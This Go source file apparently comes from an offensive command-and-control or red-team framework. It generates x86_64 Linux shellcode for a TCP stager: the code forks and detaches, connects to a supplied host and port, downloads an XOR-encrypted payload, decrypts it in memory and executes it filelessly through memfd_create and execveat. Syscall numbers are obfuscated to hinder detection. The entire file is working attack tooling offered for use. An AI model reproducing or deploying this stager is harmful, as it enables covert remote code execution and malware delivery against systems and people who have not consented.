package stager

import "net"

// asmLinuxX64 generates x86_64 Linux shellcode for a TCP stager.
//
// Flow: fork -> setsid -> socket -> connect -> read(size) ->
// mmap(size) -> recv loop -> close(sock) ->
// memfd_create -> write loop -> execveat(AT_EMPTY_PATH)
func asmLinuxX64(ip net.IP, port uint16, xorKey [4]byte) []byte {
	portBE := uint16BE(port)
	sockaddrVal := uint64(0x0002) | uint64(portBE)<<16 | uint64(ip[0])<<32 |
		uint64(ip[1])<<40 | uint64(ip[2])<<48 | uint64(ip[3])<<56
	xorKeyU32 := uint32(xorKey[0]) | uint32(xorKey[1])<<8 | uint32(xorKey[2])<<16 | uint32(xorKey[3])<<24

	var s []byte

	// fork()
	s = append(s, 0xb8, 0x39, 0x00, 0x00, 0x00) // mov eax, 57
	s = append(s, 0x0f, 0x05)                     // syscall
	s = append(s, 0x85, 0xc0)                     // test eax, eax
	s = append(s, 0x0f, 0x85)                     // jnz -> exit
	forkJmpOff := len(s)
	s = append(s, 0, 0, 0, 0)

	// setsid()
	s = append(s, 0xb8, 0x70, 0x00, 0x00, 0x00) // mov eax, 112
	s = append(s, 0x0f, 0x05)                     // syscall

	// socket(AF_INET=2, SOCK_STREAM=1, 0)
	s = append(s, 0xb8, 0x29, 0x00, 0x00, 0x00) // mov eax, 41
	s = append(s, 0xbf, 0x02, 0x00, 0x00, 0x00) // mov edi, 2
	s = append(s, 0xbe, 0x01, 0x00, 0x00, 0x00) // mov esi, 1
	s = append(s, 0x31, 0xd2)                     // xor edx, edx
	s = append(s, 0x0f, 0x05)                     // syscall
	s = append(s, 0x49, 0x89, 0xc4)               // mov r12, rax

	// connect(sock, &addr, 16)
	s = append(s, 0x6a, 0x00)                    // push 0
	s = append(s, 0x48, 0xb8)                    // movabs rax, imm64
	s = appendU64(s, sockaddrVal)
	s = append(s, 0x50)                           // push rax
	s = append(s, 0x48, 0x89, 0xe6)              // mov rsi, rsp
	s = append(s, 0xb8, 0x2a, 0x00, 0x00, 0x00) // mov eax, 42
	s = append(s, 0x4c, 0x89, 0xe7)              // mov rdi, r12
	s = append(s, 0xba, 0x10, 0x00, 0x00, 0x00) // mov edx, 16
	s = append(s, 0x0f, 0x05)                    // syscall
	s = append(s, 0x48, 0x83, 0xc4, 0x10)        // add rsp, 16
	s = append(s, 0x48, 0x85, 0xc0)              // test rax, rax
	s = append(s, 0x0f, 0x88)                    // js -> exit
	connectFailOff := len(s)
	s = append(s, 0, 0, 0, 0)

	// read(sock, &size, 4) -> r13d = payload size
	s = append(s, 0x48, 0x83, 0xec, 0x08)        // sub rsp, 8
	s = append(s, 0xb8, 0x00, 0x00, 0x00, 0x00) // mov eax, 0
	s = append(s, 0x4c, 0x89, 0xe7)              // mov rdi, r12
	s = append(s, 0x48, 0x89, 0xe6)              // mov rsi, rsp
	s = append(s, 0xba, 0x04, 0x00, 0x00, 0x00) // mov edx, 4
	s = append(s, 0x0f, 0x05)                    // syscall
	s = append(s, 0x48, 0x83, 0xf8, 0x04)        // cmp rax, 4
	s = append(s, 0x0f, 0x85)                    // jne -> exit
	readFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x44, 0x8b, 0x2c, 0x24)        // mov r13d, [rsp]
	s = append(s, 0x48, 0x83, 0xc4, 0x08)        // add rsp, 8
	// XOR-decrypt size: xor r13d, key
	s = append(s, 0x41, 0x81, 0xf5)              // xor r13d, imm32
	s = appendU32(s, xorKeyU32)

	// mmap(0, size, RW=3, PRIVATE|ANON=0x22, -1, 0)
	s = append(s, 0xb8, 0x09, 0x00, 0x00, 0x00)              // mov eax, 9
	s = append(s, 0x31, 0xff)                                  // xor edi, edi
	s = append(s, 0x44, 0x89, 0xee)                            // mov esi, r13d
	s = append(s, 0xba, 0x03, 0x00, 0x00, 0x00)              // mov edx, 3
	s = append(s, 0x41, 0xba, 0x22, 0x00, 0x00, 0x00)        // mov r10d, 0x22
	s = append(s, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff)  // mov r8, -1
	s = append(s, 0x4d, 0x31, 0xc9)                            // xor r9, r9
	s = append(s, 0x0f, 0x05)                                  // syscall
	s = append(s, 0x48, 0x85, 0xc0)                            // test rax, rax
	s = append(s, 0x0f, 0x88)                                  // js -> exit
	mmapFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x49, 0x89, 0xc6) // mov r14, rax (mmap buf)

	// recv loop
	s = append(s, 0x31, 0xdb) // xor ebx, ebx
	recvLoopStart := len(s)
	s = append(s, 0x44, 0x39, 0xeb)              // cmp ebx, r13d
	s = append(s, 0x0f, 0x8d)                    // jge recv_done
	recvDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0xb8, 0x00, 0x00, 0x00, 0x00) // mov eax, 0
	s = append(s, 0x4c, 0x89, 0xe7)              // mov rdi, r12
	s = append(s, 0x4c, 0x89, 0xf6)              // mov rsi, r14
	s = append(s, 0x48, 0x01, 0xde)              // add rsi, rbx
	s = append(s, 0x44, 0x89, 0xea)              // mov edx, r13d
	s = append(s, 0x29, 0xda)                    // sub edx, ebx
	s = append(s, 0x0f, 0x05)                    // syscall
	s = append(s, 0x48, 0x85, 0xc0)              // test rax, rax
	s = append(s, 0x0f, 0x8e)                    // jle -> exit
	recvFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x01, 0xc3) // add ebx, eax
	s = append(s, 0xe9)       // jmp recv_loop
	recvBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, recvDoneOff, len(s))
	patchRel32(s, recvBackOff, recvLoopStart)

	// XOR decrypt buffer in-place: for i=0; i<size; i++ { buf[i] ^= key[i%4] }
	// r14=buf, r13d=size, xorKey baked as imm32
	s = append(s, 0x31, 0xdb)                     // xor ebx, ebx (i=0)
	xorLoopStart := len(s)
	s = append(s, 0x44, 0x39, 0xeb)              // cmp ebx, r13d
	s = append(s, 0x0f, 0x8d)                    // jge -> xor_done
	xorDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	// Load key byte: key is 4 bytes, index = ebx & 3
	s = append(s, 0x89, 0xd9)                     // mov ecx, ebx
	s = append(s, 0x83, 0xe1, 0x03)              // and ecx, 3
	s = append(s, 0x48, 0x8d, 0x15)              // lea rdx, [rip+keyOff]
	keyLeaOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x0f, 0xb6, 0x0c, 0x0a)       // movzx ecx, byte [rdx+rcx]
	s = append(s, 0x41, 0x30, 0x0c, 0x1e)        // xor byte [r14+rbx], cl
	s = append(s, 0xff, 0xc3)                     // inc ebx
	s = append(s, 0xe9)                            // jmp xor_loop
	xorBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, xorDoneOff, len(s))
	patchRel32(s, xorBackOff, xorLoopStart)

	// close(sock)
	s = append(s, 0xb8, 0x03, 0x00, 0x00, 0x00) // mov eax, 3
	s = append(s, 0x4c, 0x89, 0xe7)              // mov rdi, r12
	s = append(s, 0x0f, 0x05)                    // syscall

	// memfd_create("", MFD_CLOEXEC=1) - syscall 319
	s = append(s, 0x48, 0x31, 0xff)              // xor rdi, rdi
	s = append(s, 0x57)                           // push rdi (null terminator on stack)
	s = append(s, 0x48, 0x89, 0xe7)              // mov rdi, rsp (points to "")
	s = append(s, 0xbe, 0x01, 0x00, 0x00, 0x00) // mov esi, 1 (MFD_CLOEXEC)
	s = x64EmitSyscall(s, 319)                   // obfuscated mov eax, 319
	s = append(s, 0x0f, 0x05)                    // syscall
	s = append(s, 0x48, 0x83, 0xc4, 0x08)        // add rsp, 8
	s = append(s, 0x48, 0x85, 0xc0)              // test rax, rax
	s = append(s, 0x0f, 0x88)                    // js -> exit
	memfdFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x49, 0x89, 0xc7) // mov r15, rax (memfd)

	// write loop: write(memfd, buf+off, remaining)
	s = append(s, 0x31, 0xdb) // xor ebx, ebx
	writeLoopStart := len(s)
	s = append(s, 0x44, 0x39, 0xeb)              // cmp ebx, r13d
	s = append(s, 0x0f, 0x8d)                    // jge write_done
	writeDoneOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0xb8, 0x01, 0x00, 0x00, 0x00) // mov eax, 1
	s = append(s, 0x4c, 0x89, 0xff)              // mov rdi, r15
	s = append(s, 0x4c, 0x89, 0xf6)              // mov rsi, r14
	s = append(s, 0x48, 0x01, 0xde)              // add rsi, rbx
	s = append(s, 0x44, 0x89, 0xea)              // mov edx, r13d
	s = append(s, 0x29, 0xda)                    // sub edx, ebx
	s = append(s, 0x0f, 0x05)                    // syscall
	s = append(s, 0x48, 0x85, 0xc0)              // test rax, rax
	s = append(s, 0x0f, 0x8e)                    // jle -> exit
	writeFailOff := len(s)
	s = append(s, 0, 0, 0, 0)
	s = append(s, 0x01, 0xc3) // add ebx, eax
	s = append(s, 0xe9)       // jmp write_loop
	writeBackOff := len(s)
	s = append(s, 0, 0, 0, 0)
	patchRel32(s, writeDoneOff, len(s))
	patchRel32(s, writeBackOff, writeLoopStart)

	// execveat(memfd, "", NULL, NULL, AT_EMPTY_PATH=0x1000) - syscall 322
	s = append(s, 0x4c, 0x89, 0xff)              // mov rdi, r15 (fd)
	s = append(s, 0x48, 0x31, 0xf6)              // xor rsi, rsi
	s = append(s, 0x56)                           // push rsi (null on stack)
	s = append(s, 0x48, 0x89, 0xe6)              // mov rsi, rsp (points to "")
	s = append(s, 0x48, 0x31, 0xd2)              // xor rdx, rdx (argv=NULL)
	s = append(s, 0x4d, 0x31, 0xd2)              // xor r10, r10 (envp=NULL)
	s = append(s, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00) // mov r8d, 0x1000 (AT_EMPTY_PATH)
	s = x64EmitSyscall(s, 322)                   // obfuscated mov eax, 322
	s = append(s, 0x0f, 0x05)                    // syscall

	// exit(1)
	exitAddr := len(s)
	s = append(s, 0xb8, 0x3c, 0x00, 0x00, 0x00) // mov eax, 60
	s = append(s, 0xbf, 0x01, 0x00, 0x00, 0x00) // mov edi, 1
	s = append(s, 0x0f, 0x05)                    // syscall

	// XOR key data (4 bytes at end of shellcode)
	keyAddr := len(s)
	s = append(s, xorKey[:]...)

	// Patch key LEA
	patchRel32(s, keyLeaOff, keyAddr)

	for _, off := range []int{forkJmpOff, connectFailOff, readFailOff, mmapFailOff, recvFailOff, memfdFailOff, writeFailOff} {
		patchRel32(s, off, exitAddr)
	}

	return s
}
